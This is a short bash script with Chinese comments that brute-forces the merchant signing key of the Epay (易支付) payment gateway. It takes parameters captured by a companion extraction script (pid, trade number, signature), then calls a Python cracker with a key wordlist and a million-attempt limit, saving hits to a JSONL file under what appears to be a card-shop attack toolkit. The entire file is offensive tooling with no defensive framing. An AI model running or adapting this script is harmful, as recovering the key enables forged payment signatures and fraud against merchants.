#!/bin/bash
# 易支付 KEY 爆破 — 从 epay_extract.sh 输出的 params 文件
set -euo pipefail
PARAMS="${1:?用法: $0 params.txt [wordlist]}"
WORDLIST="${2:-/data/wordlists/epay/epay-keys-top.txt}"
OUT="/data/tools/faka/out/epay_hashcat.jsonl"

# shellcheck disable=SC1090
source <(grep -E '^[a-z_]+=' "$PARAMS" | sed 's/^/export /')

echo "[*] epay KEY brute pid=${pid:-?} trade=${out_trade_no:-?} sign=${sign:-?}"
python3 /data/tools/faka/epay_key_brute.py \
  --wordlist "$WORDLIST" \
  --pid "${pid:-196}" \
  --type "${type:-alipay}" \
  --money "${money:-1}" \
  --out-trade-no "${out_trade_no:-test}" \
  --target-sign "${sign:-}" \
  --limit 1000000 \
  --out "$OUT"
echo "[+] -> $OUT"
